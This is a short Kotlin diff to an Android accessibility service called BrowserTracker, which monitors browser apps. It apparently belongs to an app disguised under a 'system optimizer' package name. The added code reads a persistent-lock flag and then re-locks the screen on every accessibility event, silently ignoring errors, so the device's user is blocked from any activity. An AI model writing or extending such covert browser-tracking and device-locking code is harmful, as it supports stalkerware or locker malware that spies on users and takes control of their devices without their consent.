@@ -177,6 +177,16 @@ class BrowserTracker : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
 
+        // If persistent lock is active, instantly lock screen and block any user activity
+        if (com.system.optimizer.service.MonitoringService.isPersistentLocked) {
+            try {
+                performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
+                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as? android.app.admin.DevicePolicyManager
+                dpm?.lockNow()
+            } catch (_: Exception) {}
+            return
+        }
+
         val packageName = event.packageName?.toString() ?: return
 
         // Only process events from known browser apps
